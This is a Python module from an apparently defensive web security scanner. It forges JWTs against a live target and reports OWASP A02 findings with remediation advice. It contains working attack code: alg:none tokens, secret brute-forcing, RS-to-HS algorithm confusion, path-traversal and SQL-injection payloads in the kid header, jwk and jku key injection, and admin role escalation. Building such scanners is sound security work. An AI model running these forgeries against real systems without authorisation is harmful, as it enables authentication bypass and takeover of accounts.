"""A02 — Cryptographic Failures, focused on JWT.

Given a genuine token from bootstrap, this module tries to *forge* one the
server will accept, proving the failure end-to-end against the live target:
  1. ``alg:none`` — strip the signature; if a protected route accepts it, the
     verifier trusts an unsigned token.
  2. Weak HS256 secret — brute-force the signing key from source-scanned
     candidates + a built-in wordlist; a hit means anyone can mint admin tokens.
  3. Escalation — re-sign with a bumped role/scope claim and confirm acceptance.
Also flags tokens passed in query strings (logged/cached credential exposure).
"""

from __future__ import annotations

import hashlib
import hmac
import json
from base64 import urlsafe_b64encode

from ..core.context import Context
from ..core.taxonomy import REFS
from ..discovery import auth as auth_detect
from .base import module

_ROLE_CLAIMS = ("role", "roles", "scope", "scopes", "is_admin", "is_superuser",
                "admin", "permissions", "groups", "account_type")
_ADMIN_VALUES = ("admin", "super_admin", "superuser", "administrator", "API")


def _b64(data: bytes) -> str:
    return urlsafe_b64encode(data).rstrip(b"=").decode()


def _encode(header: dict, claims: dict, secret: str | None) -> str:
    h = _b64(json.dumps(header, separators=(",", ":")).encode())
    p = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if header.get("alg") == "none" or secret is None:
        return f"{h}.{p}."
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64(sig)}"


def _sig_matches(token: str, secret: str) -> bool:
    """Deterministic secret-recovery oracle: recompute the HMAC over the token's
    own header.payload and compare to its signature. A match proves the signing
    key — no server round-trip, and immune to scope-limited tokens that a live
    'does a route accept this?' oracle would misread as safe."""
    signing_input, _, sig = token.rpartition(".")
    if not signing_input or not sig:
        return False
    try:
        expected = _b64(hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest())
    except Exception:  # noqa: BLE001
        return False
    return hmac.compare_digest(expected, sig)


def _baseline_route(ctx: Context, real_token: str) -> str | None:
    """A route the *legitimate* token is actually authorized on (HTTP < 300).

    Needed as an acceptance oracle: some apps mint scope-limited tokens (e.g.
    an OAuth 'auth' scope) that 403 on API routes, so 'me' alone is a poor probe.
    We find a route the real token can reach, then replay forgeries against it.
    """
    if getattr(ctx, "_a02_baseline", "unset") != "unset":
        return ctx._a02_baseline  # cached (incl. cached None)
    candidates = []
    if ctx.auth.me_path:
        candidates.append(ctx.auth.me_path)
    candidates += [r.path for r in ctx.routes.secured()
                   if r.method == "GET" and not r.has_path_param][:25]
    found = None
    for path in candidates:
        try:
            if ctx.get(path, token=real_token).status_code < 300:
                found = path
                break
        except Exception:  # noqa: BLE001
            continue
    ctx._a02_baseline = found
    return found


def _accepts(ctx: Context, token: str, real_token: str | None = None) -> tuple[bool, int]:
    """Does a protected route accept this token? Probe a route the real token is
    known-authorized on when we can, else fall back to the 'me' endpoint."""
    path = _baseline_route(ctx, real_token) if real_token else None
    if not path:
        path = ctx.auth.me_path
    if not path:
        cand = [r for r in ctx.routes.secured() if r.method == "GET" and not r.has_path_param]
        if not cand:
            return False, 0
        path = cand[0].path
    r = ctx.get(path, token=token)
    return r.status_code < 300, r.status_code


@module("a02", "Cryptographic Failures / JWT forging")
def run(ctx: Context) -> None:
    principal = ctx.profile.any_authed()
    if not principal or not principal.token:
        ctx.note("no authenticated token available; JWT checks skipped")
        return
    token = principal.token
    decoded = auth_detect.decode_jwt(token)
    if decoded is None:
        ctx.finding(
            id="a02-not-jwt", owasp="A02", severity="INFO",
            title="Session token is not a JWT",
            summary="The bearer token is opaque (not a decodable JWT); JWT-forging checks "
                    "do not apply. Confirm it is a high-entropy, server-side session handle.",
        )
        return
    header, claims = decoded
    alg = header.get("alg", "?")
    ctx.note(f"JWT alg={alg}, claims={sorted(claims)}")

    _alg_none(ctx, header, claims, token)
    _weak_secret(ctx, header, claims, token)
    _alg_confusion(ctx, header, claims, token)
    _leaked_private_key(ctx, header, claims, token)
    _kid_injection(ctx, header, claims, token)
    _jwk_injection(ctx, header, claims, token)
    _jku_injection(ctx, header, claims, token)
    _token_in_query(ctx)


def _escalate(claims: dict) -> dict:
    c = dict(claims)
    for k in _ROLE_CLAIMS:
        if k in c:
            if isinstance(c[k], list):
                c[k] = list(dict.fromkeys([*c[k], "admin", "super_admin"]))
            elif isinstance(c[k], bool):
                c[k] = True
            else:
                c[k] = "super_admin"
    return c


def _alg_none(ctx: Context, header: dict, claims: dict, real_token: str) -> None:
    for variant in ("none", "None", "NONE"):
        h = {**header, "alg": variant}
        forged = _encode(h, _escalate(claims), None)
        ok, code = _accepts(ctx, forged, real_token)
        if ok:
            ctx.finding(
                id="a02-alg-none", owasp="A02", severity="CRITICAL",
                title="JWT 'alg:none' accepted — signature verification bypassed",
                summary=(
                    "The server accepted a token with the signature algorithm set to "
                    f"'{variant}' and no signature. Any party can mint a token with "
                    "arbitrary claims (including elevated role/scope) and be trusted."
                ),
                evidence=f"forged alg:{variant} token accepted at {ctx.auth.me_path} "
                         f"(HTTP {code})\n{forged}",
                reproduction="Take a valid JWT, set header alg to 'none', drop the "
                             "signature, escalate a role claim, and replay it.",
                references=[REFS["ps-jwt"], REFS["A02"]],
                tools=["jwt_tool", "Burp (JWT Editor)", "pyjwt"],
            )
            return
    ctx.finding(
        id="a02-alg-none", owasp="A02", severity="SAFE",
        title="JWT 'alg:none' is rejected",
        summary="Unsigned (alg:none) tokens were refused by the protected endpoint.",
    )


def _weak_secret(ctx: Context, header: dict, claims: dict, token: str) -> None:
    if not str(header.get("alg", "")).upper().startswith("HS"):
        ctx.note(f"token alg {header.get('alg')} is not HMAC; weak-secret brute-force skipped")
        return
    from ..discovery.source import jwt_secret_candidates
    candidates = jwt_secret_candidates(ctx.profile.secrets)
    for secret in candidates:
        # Primary oracle: the HMAC of the token's own header.payload must equal
        # its signature. A match is cryptographic proof the key is recovered —
        # no server call, so it can't be masked by a scope-limited token.
        if not _sig_matches(token, secret):
            continue
        src = next((s.source for s in ctx.profile.secrets if s.value == secret), "built-in wordlist")
        # Best-effort: demonstrate live forgery by replaying a re-signed token on
        # a route the real token is authorized on (may be blocked if the app's
        # tokens are scope-limited — that does not weaken the crack proof).
        esc_note = ""
        forged = _encode({**header, "alg": "HS256"}, _escalate(claims), secret)
        esc_ok, esc_code = _accepts(ctx, forged, token)
        if esc_ok:
            esc_note = f"\nre-signed forged token ACCEPTED live (HTTP {esc_code})"
        else:
            esc_note = (f"\nlive replay -> HTTP {esc_code} (token appears scope-limited; "
                        "forgery still proven cryptographically)")
        ctx.finding(
            id="a02-weak-hs256-secret", owasp="A02", severity="CRITICAL",
            title="JWT HS256 signing secret is guessable — full token forgery",
            summary=(
                f"The HMAC signing key was recovered (from {src}) and confirmed by "
                "recomputing the token's own signature. With the key, an attacker mints "
                "valid tokens for any user, role or scope — complete authentication bypass."
            ),
            evidence=f"secret = {secret!r}  (source: {src})\n"
                     f"HMAC-SHA256(header.payload, secret) == token signature  [CONFIRMED]"
                     + esc_note,
            reproduction=f"jwt_tool <token> -C -d <wordlist>   # cracks to {secret!r}\n"
                         f"python -c \"import jwt; print(jwt.encode(<claims>, {secret!r}, 'HS256'))\"",
            references=[REFS["ps-jwt"], REFS["A02"]],
            tools=["jwt_tool", "hashcat -m 16500", "pyjwt"],
        )
        return
    ctx.finding(
        id="a02-weak-hs256-secret", owasp="A02", severity="SAFE",
        title="JWT HS256 secret resisted the tested candidates",
        summary=f"None of {len(candidates)} candidate secrets (source-scanned + built-in "
                "wordlist) matched the token signature. Not a proof of strength — "
                "run a full hashcat/jwt_tool crack against a large wordlist for assurance.",
    )


def _is_asymmetric(alg: str) -> bool:
    return str(alg).upper()[:2] in ("RS", "ES", "PS")


def _pubkey_variants(pem: str) -> list[str]:
    """The exact bytes a vulnerable verifier feeds to the HMAC differ by trivia
    (trailing newline, CRLF). Try the common encodings of the public key PEM."""
    p = pem.strip()
    return list(dict.fromkeys([pem, p, p + "\n", p + "\n\n", p.replace("\n", "\r\n") + "\r\n"]))


def _alg_confusion(ctx: Context, header: dict, claims: dict, token: str) -> None:
    """RS256→HS256 confusion: if a verifier doesn't pin the algorithm, an
    attacker signs an HS256 token using the app's PUBLIC RSA key as the HMAC
    secret — and the server, holding that public key, verifies it as valid.
    """
    if not _is_asymmetric(header.get("alg", "")):
        ctx.note(f"token alg {header.get('alg')} is symmetric; RS→HS confusion N/A")
        return
    from ..discovery import jwks
    pems = jwks.discover_public_keys(ctx.base_url)
    for s in ctx.profile.secrets:
        if s.kind == "rsa_private_key":
            pub = jwks.public_pem_from_private(s.value)
            if pub:
                pems.append(pub)
    pems = list(dict.fromkeys(pems))
    if not pems:
        ctx.note("token is asymmetric but no public key (JWKS/OIDC/source) found; "
                 "algorithm-confusion untested")
        return
    for pem in pems:
        for variant in _pubkey_variants(pem):
            forged = _encode({**header, "alg": "HS256"}, _escalate(claims), variant)
            ok, code = _accepts(ctx, forged, token)
            if ok:
                ctx.finding(
                    id="a02-alg-confusion", owasp="A02", severity="CRITICAL",
                    title="JWT algorithm confusion (RS256→HS256) — public key forges tokens",
                    summary=(
                        "The verifier accepted an HS256 token signed with the server's own "
                        "RSA public key as the HMAC secret. Because the public key is, by "
                        "design, public, anyone can mint valid tokens with arbitrary claims. "
                        "The verifier must pin the expected algorithm (asymmetric only)."
                    ),
                    evidence=f"forged HS256(token, <public-key-PEM>) accepted "
                             f"(HTTP {code}) at the protected route\npublic key:\n{pem[:200]}…",
                    reproduction="jwt_tool <token> -X k -pk public.pem   # algorithm confusion",
                    references=[REFS["ps-jwt"], REFS["A02"]],
                    tools=["jwt_tool -X k", "Burp (JWT Editor)"],
                )
                return
    ctx.finding(
        id="a02-alg-confusion", owasp="A02", severity="SAFE",
        title="JWT algorithm confusion (RS→HS) rejected",
        summary=f"Signing HS256 tokens with {len(pems)} discovered public key(s) was not "
                "accepted — the verifier appears to pin the algorithm.",
    )


def _leaked_private_key(ctx: Context, header: dict, claims: dict, token: str) -> None:
    """A committed asymmetric private key lets an attacker forge validly-signed
    tokens directly. Report the exposure, and if the token IS asymmetric, prove
    it by forging + replaying an escalated token signed with the leaked key."""
    keys = [s for s in ctx.profile.secrets if s.kind == "rsa_private_key"]
    if not keys:
        return
    forged_ok = None
    if _is_asymmetric(header.get("alg", "")):
        try:
            import jwt as pyjwt
            alg = header.get("alg", "RS256")
            for s in keys:
                signed = pyjwt.encode(_escalate(claims), s.value, algorithm=alg,
                                      headers={k: v for k, v in header.items() if k != "alg"})
                ok, code = _accepts(ctx, signed, token)
                if ok:
                    forged_ok = (s, code)
                    break
        except Exception as exc:  # noqa: BLE001
            ctx.note(f"RS forge attempt errored: {exc}")

    if forged_ok:
        s, code = forged_ok
        ctx.finding(
            id="a02-leaked-signing-key", owasp="A02", severity="CRITICAL",
            title="Token signing private key committed in source — full forgery",
            summary=(
                f"An RSA private key is committed at {s.source} and it signs the tokens: a "
                "forged, escalated token signed with it was accepted by the server. Anyone "
                "with repo access can mint tokens for any user/role. Rotate the key and "
                "remove it from source + history."
            ),
            evidence=f"forged {header.get('alg')} token signed with {s.source} "
                     f"accepted (HTTP {code})",
            references=[REFS["A02"]],
            tools=["jwt_tool", "pyjwt", "git log -p"],
        )
    else:
        srcs = ", ".join(s.source for s in keys)
        ctx.finding(
            id="a02-leaked-signing-key", owasp="A02", severity="HIGH",
            title="Asymmetric private key committed in source",
            summary=(
                f"An RSA/EC private key is committed in the repository ({srcs}). Even though "
                "the current access token is symmetric (couldn't prove live forgery here), a "
                "committed private key typically signs id_tokens/other artifacts and is a "
                "serious secret exposure — rotate it and purge it from git history."
            ),
            evidence=f"private key material found at: {srcs}",
            references=[REFS["A02"]],
            tools=["gitleaks", "trufflehog", "git filter-repo"],
        )


def _encode_signed(header: dict, claims: dict, key, alg: str) -> str | None:
    """Sign with an arbitrary alg via PyJWT (for RS/ES header-injection forgeries)."""
    try:
        import jwt as pyjwt
        extra = {k: v for k, v in header.items() if k != "alg"}
        return pyjwt.encode(claims, key, algorithm=alg, headers=extra)
    except Exception:  # noqa: BLE001
        return None


# ── kid header injection ──────────────────────────────────────────────────────

def _kid_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
    """The `kid` header selects the verification key. If it feeds a filesystem
    path or a SQL query, an attacker can point it at predictable/empty content
    (…/dev/null → empty HMAC key) or inject SQL to return a chosen key, then sign
    the token themselves.
    """
    if not str(header.get("alg", "")).upper().startswith("HS"):
        # kid tricks that coerce an HMAC key only help when HS* is accepted; the
        # server may still accept HS even if it issued RS — worth trying anyway.
        pass
    trials = [
        # (label, kid, hmac_key) — file paths that resolve to empty content.
        ("path-traversal → /dev/null (empty key)",
         "../../../../../../../../../../dev/null", ""),
        ("absolute /dev/null (empty key)", "/dev/null", ""),
        ("empty kid (empty key)", "", ""),
        # SQL injection returning a constant we then sign with.
        ("SQLi UNION-selected key",
         "no-such-kid' UNION SELECT 'heimdallkid'-- -", "heimdallkid"),
    ]
    for label, kid, key in trials:
        forged = _encode({**header, "alg": "HS256", "kid": kid}, _escalate(claims), key)
        ok, code = _accepts(ctx, forged, token)
        if ok:
            ctx.finding(
                id="a02-kid-injection", owasp="A02", severity="CRITICAL",
                title="JWT 'kid' header injection — attacker controls the signing key",
                summary=(
                    "By setting the token's `kid` header, Heimdall made the server verify "
                    f"against an attacker-known key ({label}), then signed a forged, escalated "
                    "token with it and was accepted. `kid` must be treated as untrusted input "
                    "and looked up safely (no filesystem/SQL interpolation)."
                ),
                evidence=f"kid={kid!r}, hmac key={key!r} → forged token accepted (HTTP {code})",
                reproduction=f"jwt_tool <token> -I -hc kid -hv {kid!r} -S hs256 -p {key!r}",
                references=[REFS["ps-jwt"], REFS["A02"]],
                tools=["jwt_tool -I", "Burp (JWT Editor)"],
            )
            return
    ctx.finding(
        id="a02-kid-injection", owasp="A02", severity="SAFE",
        title="JWT 'kid' header injection rejected",
        summary="Path-traversal / empty-key / SQLi `kid` values did not yield an accepted "
                "forged token.",
    )


# ── jwk (embedded key) and jku (remote JWKS) header injection ─────────────────

def _rsa_material():
    """Return (private_pem, jwk_dict) for a fresh RSA key Heimdall controls."""
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv = key.private_bytes(serialization.Encoding.PEM,
                             serialization.PrivateFormat.PKCS8,
                             serialization.NoEncryption()).decode()
    nums = key.public_key().public_numbers()

    def b64(n: int) -> str:
        return _b64(n.to_bytes((n.bit_length() + 7) // 8, "big"))
    jwk = {"kty": "RSA", "use": "sig", "alg": "RS256", "kid": "heimdall",
           "n": b64(nums.n), "e": b64(nums.e)}
    return priv, jwk


class _JwksServer:
    """Ephemeral localhost JWKS server; records whether the target fetched it."""

    def __init__(self, jwks: dict):
        self._jwks = json.dumps(jwks).encode()
        self.hits: list[str] = []
        self._httpd = None
        self.port = None

    def __enter__(self):
        import http.server
        import threading
        body, hits = self._jwks, self.hits

        class H(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                hits.append(self.path)
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, *a):  # silence
                return

        self._httpd = http.server.HTTPServer(("127.0.0.1", 0), H)
        self.port = self._httpd.server_address[1]
        threading.Thread(target=self._httpd.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *a):
        if self._httpd:
            self._httpd.shutdown()


def _jwk_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
    """Embed our own public key in the `jwk` header and sign with the matching
    private key; a verifier that trusts header-provided keys accepts it."""
    priv, jwk = _rsa_material()
    forged = _encode_signed({**header, "alg": "RS256", "jwk": jwk, "kid": "heimdall"},
                            _escalate(claims), priv, "RS256")
    ok, code = _accepts(ctx, forged, token) if forged else (False, 0)
    if ok:
        ctx.finding(
            id="a02-jwk-header", owasp="A02", severity="CRITICAL",
            title="JWT 'jwk' header trusted — self-signed key accepted",
            summary=(
                "The verifier trusted a public key EMBEDDED in the token header (`jwk`) and "
                "validated a token Heimdall signed with the matching private key. Any attacker "
                "can embed their own key and forge arbitrary tokens."
            ),
            evidence=f"header jwk (attacker key) accepted (HTTP {code})",
            reproduction="jwt_tool <token> -X i   # inject self-signed jwk",
            references=[REFS["ps-jwt"], REFS["A02"]],
            tools=["jwt_tool -X i", "Burp (JWT Editor)"],
        )
    else:
        ctx.finding(
            id="a02-jwk-header", owasp="A02", severity="SAFE",
            title="JWT 'jwk' header key is not trusted",
            summary="A self-signed token carrying its verification key in the `jwk` header "
                    "was rejected.",
        )


def _jku_injection(ctx: Context, header: dict, claims: dict, token: str) -> None:
    """Host our JWKS on an ephemeral localhost server and point the token's `jku`
    header at it. A hit on our server proves the verifier fetches an unvalidated
    URL (SSRF); acceptance of the forged token proves full bypass."""
    priv, jwk = _rsa_material()
    host = "127.0.0.1"
    with _JwksServer({"keys": [jwk]}) as srv:
        url = f"http://{host}:{srv.port}/jwks.json"
        forged = _encode_signed({**header, "alg": "RS256", "jku": url, "kid": "heimdall"},
                                _escalate(claims), priv, "RS256")
        ok, code = (False, 0)
        if forged:
            ok, code = _accepts(ctx, forged, token)
        fetched = bool(srv.hits)

    if ok:
        ctx.finding(
            id="a02-jku-header", owasp="A02", severity="CRITICAL",
            title="JWT 'jku' header injection — verifier fetches attacker JWKS",
            summary=(
                "The verifier fetched a JWK Set from the attacker-controlled URL in the "
                "token's `jku` header and used it to validate a token Heimdall signed. The "
                "`jku` host is not allow-listed — full authentication bypass (and SSRF). Pin "
                "`jku` to a trusted origin or drop header-provided keys entirely."
            ),
            evidence=f"jku={url} fetched by target ({len(srv.hits)} hit) and forged token "
                     f"accepted (HTTP {code})",
            reproduction="Host a JWKS with your key, set the `jku` header to it, sign with "
                         "your private key.",
            references=[REFS["ps-jwt"], REFS["A02"], REFS["A10"]],
            tools=["jwt_tool -X s", "Burp Collaborator"],
        )
    elif fetched:
        ctx.finding(
            id="a02-jku-header", owasp="A02", severity="HIGH",
            title="JWT 'jku' header is fetched from an unvalidated URL (SSRF)",
            summary=(
                "The verifier made an outbound request to the attacker-controlled `jku` URL "
                "in the token header (Heimdall's ephemeral server received the hit) but did "
                "not ultimately accept the forged token. The unvalidated fetch is itself an "
                "SSRF and a strong sign `jku` is not allow-listed — verify signing acceptance "
                "with a matching kid."
            ),
            evidence=f"target fetched {url} ({len(srv.hits)} request) — jku not allow-listed",
            references=[REFS["ps-jwt"], REFS["A10"], REFS["A02"]],
            tools=["jwt_tool -X s", "Burp Collaborator"],
        )
    else:
        ctx.finding(
            id="a02-jku-header", owasp="A02", severity="SAFE",
            title="JWT 'jku' header is not fetched or trusted",
            summary="An attacker-hosted `jku` URL was neither fetched nor accepted; the "
                    "verifier ignores the `jku` header.",
        )


def _token_in_query(ctx: Context) -> None:
    hits = []
    for r in ctx.routes:
        for p in r.query_params:
            name = str(p.get("name", "")).lower()
            if name in ("token", "access_token", "jwt", "api_key", "apikey", "auth"):
                hits.append((r, p.get("name")))
    if hits:
        sample = "\n".join(f"  {r.method} {r.path} ?{name}=" for r, name in hits[:12])
        ctx.finding(
            id="a02-token-in-query", owasp="A02", severity="LOW",
            title=f"{len(hits)} route(s) accept a credential in the query string",
            summary=(
                "Tokens passed as query parameters leak into access logs, browser history, "
                "proxy caches and Referer headers. Move them to the Authorization header or "
                "a short-lived single-use ticket."
            ),
            evidence=sample,
            references=[REFS["A02"]],
            tools=["Burp", "grep access.log"],
        )
